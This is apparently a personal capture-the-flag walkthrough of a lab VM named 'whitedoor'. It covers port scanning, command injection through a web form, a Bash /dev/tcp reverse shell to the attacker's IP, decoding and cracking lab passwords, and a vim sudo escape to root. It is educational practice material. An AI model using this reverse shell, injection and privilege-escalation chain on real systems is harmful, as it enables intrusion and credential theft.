@@ -1,1 +1,460 @@
+			ENUMERATION
+			
+---ifconfig---
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 16  bytes 4192 (4.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 57  bytes 6448 (6.2 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1440 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1440 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+---netdiscover---
+                                                                               
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+
+Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts               
+                                                                               
+ 8 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 480               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      2     120  Unknown vendor              
+ 10.0.2.2        52:54:00:12:35:00      2     120  Unknown vendor              
+ 10.0.2.3        08:00:27:3f:8c:b7      2     120  PCS Systemtechnik GmbH      
+ 10.0.2.41       08:00:27:e4:52:4e      2     120  PCS Systemtechnik GmbH      
+
+
+
+
+---nmap---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.41 -sS -sC -sV -A -T4 -p-    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 13:07 +03
+Nmap scan report for 10.0.2.41
+Host is up (0.00099s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.0.2.15
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              13 Nov 16 23:40 README.txt
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
+| ssh-hostkey: 
+|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
+|_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-title: Home
+|_http-server-header: Apache/2.4.57 (Debian)
+MAC Address: 08:00:27:E4:52:4E (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.99 ms 10.0.2.41
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
+               
+
+
+---we see that there are open ftp, ssh and http ports open. There is also anonymous ftp login, 
+we can use anonymous both for username and password---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ftp 10.0.2.41
+Connected to 10.0.2.41.
+220 (vsFTPd 3.0.3)
+Name (10.0.2.41:okina): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||42057|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              13 Nov 16 23:40 README.txt
+226 Directory send OK.
+ftp> more README.txt
+¡Good luck!
+
+
+
+---Okay, not much came from here, lets do some web enum---
+
+
+
+
+
+			WEB ENUM
+
+
+---I do some manual enumeration on the webpage and see there is a form which only allows us to use ls command---
+
+
+---From this we understand that this system is probably vulnerable to command injection---
+
+
+---when we do that we see the pages below---
+
+blackdoor.webp
+blackindex.php
+index.php
+whitedoor.jpg
+
+
+
+
+---I also run ctfenum and gobuster scan to find more hidden files, nothing came from those---
+
+
+---In the form we can run ls commands with piping such as "ls | id" or "ls | pwd" to get more info---
+
+
+---I run ls; cat /etc/crontab to see any actions a user can perform but nothing comes up---
+
+
+Not: Linux'ta terminalde art arda komutlar çalıştırabilirsin aralarına ; koyarak. Mesela
+
+ls; id; whoami; ip a; hostname; ip a; pwd
+
+
+
+
+---Now that we know we can run commands and can perform command injection, lets start a reverse shell
+connection to our machine---
+
+
+
+
+
+			    GAINING FOOTHOLD
+
+
+---set up the listener---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# rlwrap nc -lvnp 4040
+listening on [any] 4040 ...
+
+
+---create the reverse shell connection---
+ls; bash -c 'exec bash -i &>/dev/tcp/10.0.2.15/4040 <&1'
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# rlwrap nc -lvnp 4040
+listening on [any] 4040 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.41] 44270
+bash: cannot set terminal process group (515): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@whitedoor:/var/www/html$ ls
+ls
+blackdoor.webp
+blackindex.php
+index.php
+whitedoor.jpg
+www-data@whitedoor:/var/www/html$ cd /home
+cd /home
+
+
+---we are in---
+
+
+---lets check the user info and get more knowledge about the system and look around for some info---
+
+www-data@whitedoor:/home$ whoami
+whoami
+www-data
+www-data@whitedoor:/home$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@whitedoor:/home$ ls -la
+ls -la
+total 16
+drwxr-xr-x  4 root       root       4096 Nov 16 16:58 .
+drwxr-xr-x 18 root       root       4096 Nov 15 23:05 ..
+drwxr-x---  9 Gonzalo    whiteshell 4096 Nov 17 18:11 Gonzalo
+drwxr-xr-x  9 whiteshell whiteshell 4096 Nov 17 18:47 whiteshell
+www-data@whitedoor:/home$ cd whit	
+cd whiteshell/
+www-data@whitedoor:/home/whiteshell$ ls
+ls
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+
+---I check all the directories and find the hidden password in Desktop---
+
+
+www-data@whitedoor:/home/whiteshell$ cd Des	
+cd Desktop/
+www-data@whitedoor:/home/whiteshell/Desktop$ ls
+ls
+www-data@whitedoor:/home/whiteshell/Desktop$ ls -la
+ls -la
+total 12
+drwxr-xr-x 2 whiteshell whiteshell 4096 Nov 16 18:43 .
+drwxr-xr-x 9 whiteshell whiteshell 4096 Nov 17 18:47 ..
+-r--r--r-- 1 whiteshell whiteshell   56 Nov 16 09:07 .my_secret_password.txt
+
+www-data@whitedoor:/home/whiteshell/Desktop$ cat .my	
+cat .my_secret_password.txt 
+whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
+
+			
+
+---I copy this txt file into my machine---
+
+---now this password looks like a hash, lets try to crack it without whiteshell: in the beggining--- 
+
+
+---I tried to identify with hash-identifier and then crack it with hashcat but no luck---
+
+
+---I go to hashes.com and find that this hash is a base64 hash, so now we can crack it using
+base64 decodind and piping--- 
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/WHITEDOOR LINUX CTF]
+└─# cat whiteshell_password_hash.txt | base64 -d
+VGgxc0lzVGgzUDRzU3dPckRibGFjNQo=
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/WHITEDOOR LINUX CTF]
+└─# cat whiteshell_password_hash.txt | base64 -d | base64 -d
+Th1sIsTh3P4sSwOrDblac5
+
+
+---There, after cracking it two times, we find the password---
+
+
+
+www-data@whitedoor:/var/www/html$ su whiteshell
+su whiteshell
+Password: Th1sIsTh3P4sSwOrDblac5
+
+zsh: suspended  rlwrap nc -lvnp 4242
+
+
+
+---I tried this to login as whiteshell user multiple times but the terminal doesn't respond, 
+so I decided to go with ssh---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ssh whiteshell@10.0.2.41
+whiteshell@10.0.2.41's password: 
+Linux whitedoor 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Nov 17 18:08:29 2023 from 192.168.2.5
+whiteshell@whitedoor:~$ whoami
+whiteshell
+
+whiteshell@whitedoor:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public
+
+
+whiteshell@whitedoor:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+#
+
+whiteshell@whitedoor:/~$ sudo -l
+[sudo] password for whiteshell: 
+Sorry, user whiteshell may not run sudo on whitedoor.
+whiteshell@whitedoor:/home/Gonzalo$ 
+
+
+---so there is no result from sudo -l and crontab, gotta keep on looking---
+
+
+
+whiteshell@whitedoor:/home$ cd /home
+whiteshell@whitedoor:/home$ ls
+Gonzalo  whiteshell
+whiteshell@whitedoor:/home$ 
+
+
+---There are two users---
+
+
+---I decide to check every folder that belongs to those both users---
+
+
+whiteshell@whitedoor:/home$ ls
+Gonzalo  whiteshell
+whiteshell@whitedoor:/home$ cd Gonzalo/
+whiteshell@whitedoor:/home/Gonzalo$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public
+whiteshell@whitedoor:/home/Gonzalo$ ls -la Desktop/
+total 16
+drwxr-xr-x 2 root    Gonzalo    4096 Nov 17 19:26 .
+drwxr-x--- 9 Gonzalo whiteshell 4096 Nov 17 18:11 ..
+-r--r--r-- 1 root    root         61 Nov 16 20:49 .my_secret_hash   ///there it is
+-rw-r----- 1 root    Gonzalo      20 Nov 16 21:54 user.txt
+
+
+
+---in Gonzalo's folder we see another hidden file named .my_secret_hash, and it belongs to user Gonzalo---
+
+whiteshell@whitedoor:/home$ cd Gonzalo/Desktop/
+whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat .my_secret_hash 
+$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
+
+
+---copy this hash into my machine once again---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/WHITEDOOR LINUX CTF]
+└─# touch gonzalo_password_hash.txt 
+
+                                                                                                              
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/WHITEDOOR LINUX CTF]
+└─# cat gonzalo_password_hash.txt
+$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
+                                  
+
+
+
+---now lets crack it using john, you can use hashcat also---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/WHITEDOOR LINUX CTF]
+└─# john gonzalo_password_hash.txt                           
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+qwertyuiop       (?)     
+1g 0:00:00:29 DONE 2/3 (2024-04-22 14:43) 0.03348g/s 72.33p/s 72.33c/s 72.33C/s panget..gangsta
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+---we got gonzalo's password which is qwertyuiop, lets go---
+
+
+whiteshell@whitedoor:/home/Gonzalo/Desktop$ su Gonzalo
+Password: 
+Gonzalo@whitedoor:~/Desktop$ ls
+user.txt
+
+Gonzalo@whitedoor:~/Desktop$ cat user.txt 
+---First User Flag---
+
+
+
+
+			PRIVILEGE ESCALATION
+
+
+---The user whiteshell didnt have any sudo -l actions, lets check for this user---
+
+Gonzalo@whitedoor:~$ sudo -l
+Matching Defaults entries for Gonzalo on whitedoor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User Gonzalo may run the following commands on whitedoor:
+    (ALL : ALL) NOPASSWD: /usr/bin/vim
+
+
+---means that gonzalo can run this command without needing to be root user---
+
+
+---I check the gtfobins to find out sudo privilege escalations for vim, I find the command---
+
+
+sudo vim -c ':!/bin/sh'
+
+
+---Lets run it---
+
+
+Gonzalo@whitedoor:~$ sudo vim -c ':!/bin/sh' /usr/bin/vim
+
+# whoami
+root
+# ls
+Desktop  Documents  Downloads  Music  Pictures	Public
+# cd /root
+# ls
+root.txt
+# cat root.txt	
+---Root User Flag---
+
+
+
 
